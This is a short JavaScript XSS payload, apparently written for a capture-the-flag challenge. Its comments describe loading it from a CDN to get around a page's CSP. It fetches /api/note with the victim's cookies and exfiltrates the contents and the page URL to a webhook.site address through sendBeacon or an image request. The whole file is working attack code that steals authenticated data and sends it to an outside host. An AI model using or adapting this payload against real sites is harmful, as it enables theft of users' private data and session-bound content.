// exfil.js — loads under the page's CSP via https://cdn.jsdelivr.net
// Goal: same-origin read of /api/note (flag lives here) → exfil to your webhook
(() => {
  const WH = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588';

  const beacon = (qs) => {
    const url = `${WH}?${qs}`;
    // Prefer sendBeacon (fire-and-forget, avoids CORS noise), fall back to Image
    if (navigator.sendBeacon) {
      try { navigator.sendBeacon(url, new Blob([], { type: 'text/plain' })); return; } catch {}
    }
    const i = new Image();
    i.src = url;
  };

  const run = async () => {
    try {
      // Same-origin JSON; cookies included; no need for CORS
      const r = await fetch('/api/note', { credentials: 'include', cache: 'no-store' });
      const j = await r.json().catch(() => ({}));
      const note = (j && typeof j.note === 'string') ? j.note : '';
      beacon(`flag=${encodeURIComponent(note)}&loc=${encodeURIComponent(location.href)}`);
    } catch (e) {
      beacon(`err=${encodeURIComponent((e && (e.message || e.stack)) || String(e))}`);
    }
  };

  run();
})();
